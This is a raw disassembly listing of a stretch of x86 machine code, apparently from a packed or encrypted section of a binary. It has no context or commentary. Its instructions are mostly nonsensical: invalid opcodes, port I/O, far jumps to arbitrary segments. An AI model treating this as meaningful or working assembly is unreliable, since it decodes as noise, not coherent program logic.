  427581:	and    al,0x6e
  427583:	outs   dx,BYTE PTR ds:[esi]
  427584:	add    BYTE PTR [eiz*1+0x4343aba8],dl
  42758b:	jecxz  0x427571
  42758d:	retf   
  42758e:	inc    ebp
  42758f:	test   al,0x1c
  427591:	sub    BYTE PTR [eax],dh
  427593:	repz fdivrp st(5),st
  427596:	push   0xe78e6c4d
  42759b:	or     edx,DWORD PTR [ecx]
  42759d:	(bad)  
  42759e:	shl    DWORD PTR [ecx+0x124230e2],1
  4275a4:	dec    esp
  4275a5:	lahf   
  4275a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275a7:	jno    0x4275c3
  4275a9:	sbb    DWORD PTR [eax+0x18],ebx
  4275ac:	inc    esi
  4275ad:	push   ss
  4275ae:	lods   al,BYTE PTR ds:[esi]
  4275af:	in     al,0x4c
  4275b1:	push   edi
  4275b2:	fmul   DWORD PTR [ebp-0x3ad08570]
  4275b8:	pop    ecx
  4275b9:	inc    edx
  4275ba:	ins    DWORD PTR es:[edi],dx
  4275bb:	cdq    
  4275bc:	stc    
  4275bd:	ja     0x4275be
  4275bf:	xchg   DWORD PTR [edx-0x551e354e],ecx
  4275c5:	dec    ecx
  4275c6:	xchg   DWORD PTR [eax-0x6e],edi
  4275c9:	jmp    0xa30a:0x984c3ecf
  4275d0:	cs scas eax,DWORD PTR es:[edi]
  4275d2:	repnz mov ds:0x3f4fd1b1,al
  4275d8:	pop    esp
  4275d9:	and    cl,bh
  4275db:	inc    ebx
  4275dc:	pop    ecx
  4275dd:	dec    edx
  4275de:	or     BYTE PTR [edi],ch
  4275e0:	pushf  
  4275e1:	and    dl,BYTE PTR [edi+0x16]
  4275e4:	std    
  4275e5:	out    dx,al
  4275e6:	xor    esi,0xffffffcc
  4275e9:	cmc    
  4275ea:	pop    eax
  4275eb:	sub    eax,0xc652a0d9
  4275f0:	push   ebp
  4275f1:	nop
  4275f2:	test   eax,0x3ef82249
  4275f7:	mov    BYTE PTR [eax],bl
  4275f9:	mov    WORD PTR [ecx],ss
  4275fb:	cdq    
  4275fc:	(bad)  
  4275fd:	aam    0x1d
  4275ff:	lods   al,BYTE PTR ds:[esi]
  427600:	je     0x427615
  427602:	xchg   esp,eax
  427603:	jb     0x427652
  427605:	or     al,0xcb
  427607:	int    0xf0
  427609:	loope  0x4275e5
  42760b:	dec    eax
  42760c:	scas   eax,DWORD PTR es:[edi]
  42760d:	mov    eax,ds:0xd8c8fa0a
  427612:	scas   eax,DWORD PTR es:[edi]
  427613:	mov    ss,esi
  427615:	(bad)  
  427616:	xchg   ebp,eax
  427617:	xlat   BYTE PTR ds:[ebx]
  427618:	add    esi,DWORD PTR [esp+eax*2]
  42761b:	xor    esi,esp
  42761d:	ror    BYTE PTR [ebp+0x5f92b530],1
  427623:	jnp    0x42769d
  427625:	js     0x427612
  427627:	call   0xaa02:0x737d5066
  42762e:	cmp    esp,DWORD PTR [eax+0x20]
  427631:	sub    ebx,ecx
  427633:	retf   0x60ec
  427636:	jecxz  0x42767b
  427638:	fcmovbe st,st(0)
  42763a:	xchg   esi,eax
  42763b:	xor    edi,DWORD PTR [edx]
  42763d:	mov    eax,ecx
  42763f:	xor    bh,BYTE PTR [ecx-0x1d]
  427642:	sub    al,0xa1
  427644:	not    DWORD PTR [ecx-0x6e]
  427647:	adc    al,0x5a
  427649:	in     eax,0x87
  42764b:	pop    ecx
  42764c:	add    al,0xc9
  42764e:	std    
  42764f:	mov    dl,BYTE PTR [ebp-0xf]
  427652:	lds    eax,FWORD PTR [eax+0x50aa1323]
  427658:	mov    esi,0xf6446d9b
  42765d:	pop    es
  42765e:	jmp    0x42d4abad
  427663:	loope  0x42761e
  427665:	ins    BYTE PTR es:[edi],dx
  427666:	mov    edx,0x1b240656
  42766b:	test   DWORD PTR [eax],0xf41acd29
  427671:	xor    DWORD PTR [eax],edx
  427673:	push   ebx
  427674:	mov    bh,dh
  427676:	inc    ebp
  427677:	adc    eax,0xcb92875d
  42767c:	mov    eax,DWORD PTR [edi+ecx*4+0x21775289]
  427683:	mov    al,ds:0x65512493
  427688:	cmp    dl,dh
  42768a:	repz mov eax,ds:0xccb0428d
  427690:	rcr    DWORD PTR [edx],0x61
  427693:	and    al,0xaf
  427695:	xor    DWORD PTR [esi],eax
  427697:	pop    ebx
  427698:	xchg   edi,ecx
  42769a:	fsubr  st,st(1)
  42769c:	mov    eax,ds:0x2a116ee1
  4276a1:	adc    DWORD PTR cs:[edx+0x1e],ecx
  4276a5:	inc    ecx
  4276a6:	inc    eax
  4276a7:	mov    bh,0xc2
  4276a9:	hlt    
  4276aa:	(bad)  
  4276ab:	stos   DWORD PTR es:[edi],eax
  4276ac:	pop    ebp
  4276ad:	push   es
  4276ae:	int    0xe6
  4276b0:	movaps xmm1,xmm6
  4276b3:	pop    eax
  4276b4:	or     esp,DWORD PTR [edi+0x3f]
  4276b7:	popa   
  4276b8:	pop    ebx
  4276b9:	inc    edx
  4276ba:	imul   BYTE PTR ds:[ecx]
  4276bd:	cmc    
  4276be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4276bf:	sub    eax,0xa8438559
  4276c4:	rcl    DWORD PTR [edi],cl
  4276c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4276c7:	in     al,dx
  4276c8:	ins    DWORD PTR es:[edi],dx
  4276c9:	mov    ah,BYTE PTR [esi]
  4276cb:	inc    ebp
  4276cc:	dec    edi
  4276cd:	sbb    BYTE PTR [eax-0x309ab8d5],ah
  4276d3:	lds    edi,FWORD PTR [eax-0x6bee64c9]
  4276d9:	test   DWORD PTR [ecx-0x1fe331d8],esp
  4276df:	mov    edi,es
  4276e1:	dec    esi
  4276e2:	fsub   QWORD PTR [ebx]
  4276e4:	cmp    ecx,ecx
  4276e6:	(bad)  
  4276e7:	div    BYTE PTR [edi-0x11290293]
  4276ed:	aas    
  4276ee:	xor    ah,dl
  4276f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4276f1:	leave  
  4276f2:	xchg   ecx,eax
  4276f3:	(bad)  
  4276f4:	into   
  4276f5:	test   eax,0xbe60f870
  4276fa:	xchg   ecx,eax
  4276fb:	pop    es
  4276fc:	xchg   ecx,eax
  4276fd:	cld    
  4276fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4276ff:	add    DWORD PTR [eax-0x159d5f91],0x936ec319
  427709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42770a:	or     DWORD PTR [ebp-0x72],0x59
  42770e:	aaa    
  42770f:	pop    edi
  427710:	dec    eax
  427711:	cmp    al,0x6c
  427713:	jecxz  0x4276cc
  427715:	lods   al,BYTE PTR ds:[esi]
  427716:	xchg   ebp,eax
  427717:	je     0x4276eb
  427719:	ret    
  42771a:	dec    ebx
  42771b:	and    ah,0x63
  42771e:	icebp  
  42771f:	outs   dx,DWORD PTR ds:[esi]
  427720:	jg     0x42777d
  427722:	inc    edi
  427723:	scas   al,BYTE PTR es:[edi]
  427724:	aam    0x57
  427726:	sbb    al,0xcc
  427728:	pusha  
  427729:	sub    al,0x68
  42772b:	test   DWORD PTR [eax-0x56],ebp
  42772e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42772f:	sti    
  427730:	and    al,cl
  427732:	and    DWORD PTR [ebx+0x6f],ebx
  427735:	push   0xd65fcf6b
  42773a:	fnstenv [ebx+eax*4]
  42773d:	fsub   QWORD PTR [eax+0x48a25594]
  427743:	mov    ds:0x3ff3bc11,eax
  427748:	jae    0x427787
  42774a:	inc    esp
  42774b:	cmovg  edi,DWORD PTR [esi-0x64]
  42774f:	les    esi,FWORD PTR [edx+0x55eb1ede]
  427755:	call   DWORD PTR [esi]
  427757:	add    eax,0x261e0f1f
  42775c:	dec    ecx
  42775d:	xchg   edx,eax
  42775e:	ret    0x6635
  427761:	fistp  QWORD PTR [ebx]
  427763:	pop    edi
  427764:	inc    esp
  427765:	ins    BYTE PTR es:[edi],dx
  427766:	(bad)  
  427767:	rcr    DWORD PTR [edx-0x2cd0796f],1
  42776d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42776e:	pop    edi
  42776f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427770:	fs vmread ebx,ecx
  427774:	push   edi
  427775:	ins    BYTE PTR es:[edi],dx
  427776:	cmc    
  427777:	push   0x43
  427779:	jne    0x4277a1
  42777b:	sar    bl,1
  42777d:	loop   0x427765
  42777f:	in     al,dx
  427780:	mov    ebx,0x1d022fc6
  427785:	cwde   
  427786:	jmp    0x9777:0x4cb2c474
  42778d:	shl    edx,1
  42778f:	js     0x4277b6
  427791:	and    ebp,DWORD PTR es:[edx+0x68645245]
  427798:	outs   dx,BYTE PTR ds:[esi]
  427799:	cwde   
  42779a:	mov    esp,0x9f5c89f2
  42779f:	mov    ds:0x2cef2379,eax
  4277a4:	mov    eax,0xe4b5f420
  4277a9:	cmc    
  4277aa:	imul   edi,DWORD PTR [edx+eiz*4-0x20],0x82f0059e
  4277b2:	and    eax,0xddad
	...
  4277bf:	add    BYTE PTR [eax],al
  4277c1:	sub    al,0x44
  4277c3:	and    edi,DWORD PTR [eax+0x6b]
  4277c6:	jg     0x427847
  4277c8:	push   esp
  4277c9:	adc    edi,DWORD PTR [ebp-0x7e795d8a]
  4277cf:	cmp    eax,0x1edb167
  4277d4:	add    BYTE PTR [ebx+eax*1+0x165c0000],ch
  4277db:	fcmove st,st(0)
  4277dd:	xchg   ebx,eax
  4277de:	sub    eax,0xf71e863f
  4277e3:	ret    
  4277e4:	nop
  4277e5:	xchg   ecx,eax
  4277e6:	add    BYTE PTR [edx],ah
  4277e8:	gs jmp 0x427781
  4277eb:	sbb    DWORD PTR [ecx+0x49],0x22d52073
  4277f2:	stos   BYTE PTR es:[edi],al
  4277f3:	test   DWORD PTR [ecx+ecx*4-0x76ba1b1d],esi
  4277fa:	ins    DWORD PTR es:[edi],dx
  4277fb:	adc    eax,0x98a0bed4
  427800:	es xchg edx,eax
  427802:	pop    ds
  427803:	mov    dh,0xe9
  427805:	mov    al,0x72
  427807:	or     eax,0x1e1998f0
  42780c:	push   ds
  42780d:	jle    0x42788e
  42780f:	xor    ch,BYTE PTR ds:0x1c3db9ef
  427815:	jl     0x4277db
  427817:	mov    ah,0xb0
  427819:	xor    al,0xc5
  42781b:	and    al,0xae
  42781d:	jge    0x4277a0
  42781f:	cdq    
  427820:	dec    edx
  427821:	mov    edx,0xffa4f7c5
  427826:	out    dx,al
  427827:	(bad)  
  427829:	pop    edx
  42782a:	push   DWORD PTR [esp+ebx*8]
  42782d:	ret    
  42782e:	sub    DWORD PTR [esi+0x53],esi
  427831:	cmp    dl,bl
  427833:	rol    ebx,cl
  427835:	scas   eax,DWORD PTR es:[edi]
  427836:	loop   0x42787e
  427838:	icebp  
  427839:	sbb    dh,bl
  42783b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42783c:	aas    
  42783d:	sub    DWORD PTR [ebp-0x58ff9f06],0x1b
  427844:	mov    ecx,0x8e714725
  427849:	out    dx,eax
  42784a:	mov    ebp,0x63833aef
  42784f:	and    al,0xa
  427851:	pop    es
  427852:	dec    edi
  427853:	pop    ebx
  427854:	push   DWORD PTR [eax]
  427856:	mov    BYTE PTR [ebx-0x6da2c45c],bh
  42785c:	pop    ds
  42785d:	shl    BYTE PTR [esp+edx*4],0x95
  427861:	loope  0x427849
  427863:	pop    esp
  427864:	aas    
  427865:	leave  
  427866:	sub    BYTE PTR [edx+0x71],ch
  427869:	or     BYTE PTR [esi+0x38b5564f],0xbc
  427870:	jge    0x427869
  427872:	fcomp  QWORD PTR [ebp+0x56]
  427875:	sahf   
  427876:	adc    al,0x5c
  427878:	out    dx,eax
  427879:	xchg   DWORD PTR [ecx-0x4a],edx
  42787c:	addr16 retf 
  42787e:	lock adc DWORD PTR [esi-0x2e],ecx
  427882:	cmc    
  427883:	ds sub al,0x3
  427886:	dec    edi
  427887:	inc    esp
  427888:	jbe    0x4278a6
  42788a:	or     eax,0x3373bda1
  42788f:	mul    DWORD PTR [ecx+ecx*1+0x4895ff00]
  427896:	pop    ebx
  427897:	and    eax,eax
  427899:	sti    
  42789a:	mov    WORD PTR [esp+edx*8+0x53eeeac3],?
  4278a1:	hlt    
  4278a2:	inc    eax
  4278a3:	mov    cl,0xd2
  4278a5:	mov    edi,0x61e62669
  4278aa:	mov    bh,BYTE PTR [ecx]
  4278ac:	idiv   bl
  4278ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4278af:	stos   DWORD PTR es:[edi],eax
  4278b0:	or     edx,ebp
  4278b2:	cmp    eax,0xb28b00cc
  4278b7:	adc    eax,ebx
  4278b9:	mov    esi,0x29892850
  4278be:	std    
  4278bf:	cwde   
  4278c0:	adc    al,0xdd
  4278c2:	pop    ss
  4278c3:	fsub   QWORD PTR [eax+0x60]
  4278c6:	loope  0x42790f
  4278c8:	xchg   ecx,eax
  4278c9:	and    ebp,DWORD PTR [edi]
  4278cb:	pop    es
  4278cc:	leave  
  4278cd:	cli    
  4278ce:	pop    es
  4278cf:	add    bl,BYTE PTR ds:0xdb72c244
  4278d5:	mov    ds:0x749db160,al
  4278da:	mov    DWORD PTR [ebx-0x78c959e1],ecx
  4278e0:	xor    dl,BYTE PTR [edx+0x22]
  4278e3:	dec    edi
  4278e4:	stos   BYTE PTR es:[edi],al
  4278e5:	mov    ecx,0x80f52790
  4278ea:	pop    ecx
  4278eb:	iret   
  4278ec:	jg     0x427876
  4278ee:	inc    edx
  4278ef:	push   ebx
  4278f0:	mov    edi,DWORD PTR [esi]
  4278f2:	adc    ebx,ebp
  4278f4:	ret    
  4278f5:	ins    BYTE PTR es:[edi],dx
  4278f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4278f7:	adc    esi,edi
  4278f9:	call   0xaf09544b
  4278fe:	add    ecx,DWORD PTR [esp+ebx*8+0x1dda168a]
  427905:	enter  0x9bc1,0x59
  427909:	mov    ds:0x50daacf3,al
  42790e:	stos   DWORD PTR es:[edi],eax
  42790f:	sbb    bh,ch
  427911:	std    
  427912:	push   esi
  427913:	out    dx,eax
  427914:	adc    al,0x72
  427916:	sub    al,0x2f
  427918:	neg    DWORD PTR [ebx]
  42791a:	jae    0x427920
  42791c:	adc    DWORD PTR [eax-0x51],edx
  42791f:	mov    ch,0x6a
  427921:	jmp    0x55c0:0xd91473c4
  427928:	int    0x1
  42792a:	or     BYTE PTR [ecx+0x4b],dh
  42792d:	jne    0x42791d
  42792f:	js     0x427972
  427931:	arpl   WORD PTR [edx+0x3b449273],dx
  427937:	cmp    ch,BYTE PTR [esi+0x46c0d97d]
  42793d:	xor    bh,0xf
  427940:	inc    edi
  427941:	stos   BYTE PTR es:[edi],al
  427942:	mov    bl,0xec
  427944:	out    0xd0,al
  427946:	les    ecx,FWORD PTR [edx+0x49cd85e7]
  42794c:	cld    
  42794d:	pop    esi
  42794e:	jmp    0x4279bf
  427950:	jbe    0x427999
  427952:	or     BYTE PTR [edx],dh
  427954:	mov    ds:0xda49786c,al
  427959:	int    0x70
  42795b:	(bad)  
  42795c:	rol    DWORD PTR [esi],cl
  42795e:	adc    ah,BYTE PTR [ebp+0x52]
  427961:	inc    esp
  427962:	fbstp  TBYTE PTR [edx]
  427964:	sub    ebp,ebx
  427966:	inc    ebx
  427967:	xchg   ebx,eax
  427968:	mov    ?,WORD PTR [eax+0x1]
  42796b:	call   0x86c15678
  427970:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427971:	sub    DWORD PTR [edx-0xc],ebp
  427974:	(bad)  
  427975:	ins    DWORD PTR es:[edi],dx
  427976:	push   ecx
  427977:	rol    BYTE PTR [eax],0x82
  42797a:	ds ins BYTE PTR es:[edi],dx
  42797c:	in     al,0x71
  42797e:	clc    
  42797f:	leave  
  427980:	adc    al,0x76
  427982:	cmp    DWORD PTR [ebx-0x51],eax
  427985:	arpl   WORD PTR [edi],bp
  427987:	nop
  427988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427989:	jnp    0x4279b7
  42798b:	retf   
  42798c:	xor    bh,dl
  42798e:	pop    edx
  42798f:	das    
  427990:	mov    esp,0x13a33778
  427995:	mov    ds,WORD PTR ds:0xf800bc62
  42799b:	xchg   edx,eax
  42799c:	sbb    BYTE PTR [edx-0x52],ch
  42799f:	mov    bh,0xa3
  4279a1:	sahf   
  4279a2:	mov    es,WORD PTR [ebp+0x324d9c59]
  4279a8:	xchg   ecx,eax
  4279a9:	fwait
  4279aa:	(bad)  
  4279ab:	clc    
  4279ac:	idiv   ebp
  4279ae:	clc    
  4279af:	pop    esp
  4279b0:	aas    
  4279b1:	mov    bl,0x61
  4279b3:	or     DWORD PTR [eax+0x4f],0xffffffb5
  4279b7:	fwait
  4279b8:	and    DWORD PTR [ebp+0x2df51552],esp
  4279be:	jae    0x4279e6
  4279c0:	mov    eax,ds:0xe4bf8f33
  4279c5:	daa    
  4279c6:	sub    eax,0x8c910cf0
  4279cb:	fistp  DWORD PTR [ebx+0x66]
  4279ce:	push   cs
  4279cf:	push   ebp
  4279d0:	mov    ch,0x60
  4279d2:	in     al,0x4f
  4279d4:	push   0xa0544194
  4279d9:	not    ah
  4279db:	nop
  4279dc:	mov    ecx,0x5e2c9ae5
  4279e1:	jg     0x427a5c
  4279e3:	popf   
  4279e4:	int    0x9c
  4279e6:	cmp    ah,ah
  4279e8:	xlat   BYTE PTR ds:[ebx]
  4279e9:	aaa    
  4279ea:	and    DWORD PTR [ebx-0x19b28f94],ebp
  4279f0:	push   esp
  4279f1:	das    
  4279f2:	mov    eax,ds:0x5bbbaddb
  4279f7:	pop    ss
  4279f8:	mov    ebx,0xd9ebad26
  4279fd:	test   DWORD PTR [eax-0x67],ecx
  427a00:	cmp    eax,0xba42fbe5
  427a05:	pop    ebx
  427a06:	jmp    0x4279d3
  427a08:	cwde   
  427a09:	jmp    0xd609:0x145091e2
  427a10:	fcom   QWORD PTR [ecx-0x50bc4bed]
  427a16:	pop    es
  427a17:	retf   0xd2a4
  427a1a:	and    edx,edi
  427a1c:	mov    DWORD PTR [edi+0x71],esi
  427a1f:	jne    0x427a42
  427a21:	fisubr WORD PTR [edx+0x69]
  427a24:	lahf   
  427a25:	lods   eax,DWORD PTR ds:[esi]
  427a26:	fstp   DWORD PTR [ecx-0xb]
  427a29:	and    eax,0x7706be61
  427a2e:	ret    0x50e5
  427a31:	ins    DWORD PTR es:[edi],dx
  427a32:	cmp    al,0x57
  427a34:	or     edx,esi
  427a36:	xchg   edi,eax
  427a37:	adc    eax,0x922c1dae
  427a3c:	dec    edx
  427a3d:	sbb    BYTE PTR [ecx+edi*2],cl
  427a40:	lods   eax,DWORD PTR ds:[esi]
  427a41:	and    DWORD PTR [ecx],edx
  427a43:	xchg   esp,eax
  427a44:	mov    ecx,0x8994fcde
  427a49:	sbb    WORD PTR [bx+si+0x10b3],bx
  427a4f:	clc    
  427a50:	mov    ch,0x5c
  427a52:	mov    bl,0xfc
  427a54:	or     eax,0x470ab449
  427a59:	cmp    DWORD PTR [esi+0x96bbc12],0xa5c1e46a
  427a63:	adc    BYTE PTR [edi],0xfb
  427a66:	adc    edx,ebx
  427a68:	ss mov bl,0xbb
  427a6b:	mov    edx,0xa3de18bb
  427a70:	cmp    ecx,ebx
  427a72:	xchg   edx,eax
  427a73:	add    esp,DWORD PTR [edx-0x3a]
  427a76:	jecxz  0x427af0
  427a78:	add    ebp,esi
  427a7a:	dec    esi
  427a7b:	lods   eax,DWORD PTR ds:[esi]
  427a7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a7d:	cmp    al,0xdf
  427a7f:	stos   DWORD PTR es:[edi],eax
  427a80:	je     0x427a7a
  427a82:	sub    cl,dh
  427a84:	test   bh,bh
  427a86:	or     bh,al
  427a88:	add    BYTE PTR [esi-0x76],dl
  427a8b:	pop    ds
  427a8c:	mov    esp,0xa12374a7
  427a91:	dec    ebp
  427a92:	sbb    al,0xd3
  427a94:	enter  0x4d16,0x24
  427a98:	adc    esi,ebp
  427a9a:	ds mov edx,0xf50839b1
  427aa0:	imul   edx,esi,0x6a04fafe
  427aa6:	xchg   edi,eax
  427aa7:	sub    ebp,ebp
  427aa9:	sbb    al,0x5c
  427aab:	btr    esp,eax
  427aae:	call   0xa997b3cf
  427ab3:	mov    cl,0x2f
  427ab5:	fwait
  427ab6:	in     eax,dx
  427ab7:	call   0x1488:0x6cd6db33
  427abe:	jmp    0x64e2:0x5863c3db
  427ac5:	add    BYTE PTR [edx+0x5b],al
  427ac8:	inc    ah
  427aca:	loopne 0x427b19
  427acc:	repnz nop
  427ace:	sbb    al,0xe5
  427ad0:	popa   
  427ad1:	fidivr WORD PTR [edx+0x45607652]
  427ad7:	mov    esi,0x29c913e9
  427adc:	addr16 sub al,0x81
  427adf:	add    BYTE PTR [edi+0x3f9567fb],dh
  427ae5:	fnstsw WORD PTR [ebp-0x32c96048]
  427aeb:	mov    dh,0x61
  427aed:	repz inc ebp
  427aef:	stos   DWORD PTR es:[edi],eax
  427af0:	dec    ebp
  427af1:	cmp    cl,ah
  427af3:	fisubr DWORD PTR [esi-0x39]
  427af6:	jns    0x427acf
  427af8:	cli    
  427af9:	shl    edx,1
  427afb:	or     al,BYTE PTR [edx]
  427afd:	(bad)  
  427afe:	jge    0x427b74
  427b00:	sub    ebp,DWORD PTR [ecx+0x13845b17]
  427b06:	fcom   DWORD PTR [ecx]
  427b08:	jg     0x427b02
  427b0a:	sbb    dl,0x7e
  427b0d:	stos   DWORD PTR es:[edi],eax
  427b0e:	jmp    0xeacace76
  427b13:	pop    es
  427b14:	outs   dx,DWORD PTR ds:[esi]
  427b15:	and    esp,DWORD PTR [ecx+ebp*2+0x8]
  427b19:	fstp   DWORD PTR [ebp+0x3701f908]
  427b1f:	sub    eax,0x82cf9356
  427b24:	mov    ecx,0xb3267f5e
  427b29:	test   edx,esp
  427b2b:	aaa    
  427b2c:	and    al,0x10
  427b2e:	mov    BYTE PTR [edi+esi*8+0x19b1a75],al
  427b35:	outs   dx,DWORD PTR ds:[esi]
  427b36:	mov    ebx,DWORD PTR ds:0xb0bbe3a7
  427b3c:	pop    edx
  427b3d:	daa    
  427b3e:	dec    BYTE PTR [esi+0x3fbed3ee]
  427b44:	scas   eax,DWORD PTR es:[edi]
  427b45:	and    DWORD PTR [esi-0x66],ebp
  427b48:	push   ebp
  427b49:	movntq QWORD PTR ds:0xde80a48f,mm3
  427b50:	imul   ebx,DWORD PTR [edx+0x63],0xedcde2f9
  427b57:	je     0x427b0a
  427b59:	jge    0x427ae4
  427b5b:	or     ebp,DWORD PTR ds:0x2fb8e99c
  427b61:	cmp    DWORD PTR ds:0x94d32daf,0xffffff90
  427b68:	ins    DWORD PTR es:[edi],dx
  427b69:	(bad)  
  427b6a:	cdq    
  427b6b:	mov    edi,0x95991a1b
  427b70:	repnz retfw 
  427b73:	or     al,0x89
  427b75:	or     al,0xe
  427b77:	rcl    BYTE PTR [edi-0x8],0xb3
  427b7b:	xor    edi,DWORD PTR [ecx]
  427b7d:	jae    0x427b5f
  427b7f:	fwait
  427b80:	std    
  427b81:	push   eax
  427b82:	and    DWORD PTR [edx],eax
  427b84:	ret    
	...
  427b91:	sub    esp,eax
  427b93:	jnp    0x427bcd
  427b95:	sti    
  427b96:	mov    ebx,0x345ef36b
  427b9b:	aaa    
  427b9c:	mov    eax,esp
  427b9e:	fnstenv [ebx]
  427ba0:	pop    esp
  427ba1:	pop    ebp
  427ba2:	icebp  
  427ba3:	add    DWORD PTR [eax],eax
  427ba5:	lods   al,BYTE PTR ds:[esi]
  427ba6:	add    eax,DWORD PTR [eax]
  427ba8:	add    BYTE PTR [edx+0x10],cl
  427bab:	push   eax
  427bac:	ret    0xdc5
  427baf:	mov    ecx,DWORD PTR [ebp+0x8]
  427bb2:	cld    
  427bb3:	sub    bh,BYTE PTR [ecx+0x3153a3e2]
  427bb9:	or     eax,0x59c2aa67
  427bbe:	das    
  427bbf:	add    dl,BYTE PTR [eax]
  427bc1:	ret    
  427bc2:	jno    0x427b7c
  427bc4:	add    al,0xe1
  427bc6:	nop
  427bc7:	dec    ebp
  427bc8:	mov    ch,al
  427bca:	or     BYTE PTR [ecx],0xe2
  427bcd:	adc    al,0xdd
  427bcf:	ss cs jp 0x427ba1
  427bd3:	pop    ecx
  427bd4:	imul   ebp,ebp,0xfffffff5
  427bd7:	mov    ds:0x5cbe2625,al
  427bdc:	and    cl,cl
  427bde:	jl     0x427b8c
  427be0:	iret   
  427be1:	xchg   DWORD PTR [ecx-0x61],ebp
  427be4:	dec    ecx
  427be5:	call   0xfa9e274d
  427bea:	dec    esi
  427beb:	xchg   BYTE PTR [esi+edi*8+0x26c625a],ch
  427bf2:	pop    esi
  427bf3:	and    al,0x1c
  427bf5:	loop   0x427c0b
  427bf7:	dec    esi
  427bf8:	aam    0x63
  427bfa:	mov    ch,0x32
  427bfc:	test   bh,ch
  427bfe:	jmp    0xec36:0xe56fcb6c
  427c05:	pop    ecx
  427c06:	inc    ebp
  427c07:	mov    al,0xc5
  427c09:	pop    esp
  427c0a:	mov    edx,0xba3644a4
  427c0f:	and    dl,ch
  427c11:	aaa    
  427c12:	xchg   esi,eax
  427c13:	mov    ah,BYTE PTR [ebp+0x68]
  427c16:	xchg   esp,eax
  427c17:	pushf  
  427c18:	scas   eax,DWORD PTR es:[edi]
  427c19:	daa    
  427c1a:	fcomi  st,st(6)
  427c1c:	adc    ecx,DWORD PTR [esi-0x25]
  427c1f:	int    0xd2
  427c21:	pop    ss
  427c22:	dec    eax
  427c23:	stos   BYTE PTR es:[edi],al
  427c24:	dec    edi
  427c25:	mov    ebx,0x8c3b4f8d
  427c2a:	fist   DWORD PTR [ecx+ecx*4-0x1f460e56]
  427c31:	rcl    DWORD PTR [ebx],cl
  427c33:	in     al,dx
  427c34:	push   eax
  427c35:	imul   ebx,ecx,0xa6f1fdca
  427c3b:	je     0x427c16
  427c3d:	add    bl,ah
  427c3f:	hlt    
  427c40:	jb     0x427bfc
  427c42:	xchg   esi,eax
  427c43:	(bad)  
  427c44:	mov    dl,dh
  427c46:	jns    0x427c03
  427c48:	sbb    DWORD PTR [ebp+0x1c],ebx
  427c4b:	lods   eax,DWORD PTR ds:[esi]
  427c4c:	fld    DWORD PTR [ebx-0x77c1080f]
  427c52:	outs   dx,BYTE PTR ds:[esi]
  427c53:	lods   eax,DWORD PTR ds:[esi]
  427c54:	xchg   edx,eax
  427c55:	lods   eax,DWORD PTR ds:[esi]
  427c56:	lahf   
  427c57:	push   0x60a7f2a4
  427c5c:	sar    BYTE PTR [ebx+0x7b2dcfd],1
  427c62:	sbb    eax,0x1fec8028
  427c67:	inc    esi
  427c68:	inc    eax
  427c69:	in     eax,dx
  427c6a:	jmp    0x6291:0x835a10ea
  427c71:	sub    ah,BYTE PTR [ebp+0x4f]
  427c74:	outs   dx,BYTE PTR gs:[esi]
  427c76:	pop    ds
  427c77:	xchg   ebp,eax
  427c78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c79:	push   0xb157be93
  427c7e:	mov    eax,ds:0xacb8a7f
  427c83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c84:	mov    esi,DWORD PTR [esi-0x4f]
  427c87:	inc    edx
  427c88:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  427c8a:	icebp  
  427c8b:	imul   ebp,DWORD PTR [ecx-0x60],0x7aa12f8c
  427c92:	xor    ebx,DWORD PTR [eax+0x37]
  427c95:	dec    esp
  427c96:	and    eax,0xcbba5969
  427c9b:	rol    ch,1
  427c9d:	popa   
  427c9e:	mov    ds:0xb5575f1d,al
  427ca3:	mov    edx,0x123a373f
  427ca8:	xor    ah,BYTE PTR [ecx]
  427caa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427cab:	test   BYTE PTR [eax-0x23],ah
  427cae:	dec    ecx
  427caf:	popf   
  427cb0:	adc    eax,ebx
  427cb2:	mov    esi,0xdcfced00
  427cb7:	add    eax,0x36793f17
  427cbc:	test   al,0xd9
  427cbe:	shr    BYTE PTR [ebx-0x2c],cl
  427cc1:	out    dx,eax
  427cc2:	out    dx,al
  427cc3:	inc    edi
  427cc4:	bound  esp,QWORD PTR [ebx-0x6e7a03b1]
  427cca:	nop
  427ccb:	add    ecx,DWORD PTR [ecx]
  427ccd:	sbb    ebp,DWORD PTR [ecx-0x3c34db79]
  427cd3:	sahf   
  427cd4:	push   0x76
  427cd6:	cdq    
  427cd7:	mov    esp,0x9715169
  427cdc:	retf   
  427cdd:	sub    eax,0xd8370d5d
  427ce2:	sar    BYTE PTR ds:0x7b242d77,0xaf
  427ce9:	xchg   BYTE PTR [ebx],dh
  427ceb:	mov    eax,0xc0bd4e55
  427cf0:	push   ss
  427cf1:	jne    0x427d30
  427cf3:	out    dx,eax
  427cf4:	xchg   ecx,eax
  427cf5:	inc    esi
  427cf6:	push   edx
  427cf7:	in     eax,0x52
  427cf9:	sub    al,bl
  427cfb:	mov    ds:0xb7f854b0,al
  427d00:	cmp    al,0x25
  427d02:	ja     0x427cf5
  427d04:	in     eax,dx
  427d05:	fist   WORD PTR es:0xe51a9f8e
  427d0c:	retf   
  427d0d:	repnz sbb BYTE PTR [edx],0x21
  427d11:	ss ss mov al,0x79
  427d15:	cdq    
  427d16:	(bad)  
  427d17:	ins    BYTE PTR es:[edi],dx
  427d18:	leave  
  427d19:	shr    BYTE PTR [eax+0x20],1
  427d1c:	(bad)  
  427d1e:	mov    BYTE PTR [edi-0x58875baf],dl
  427d24:	clc    
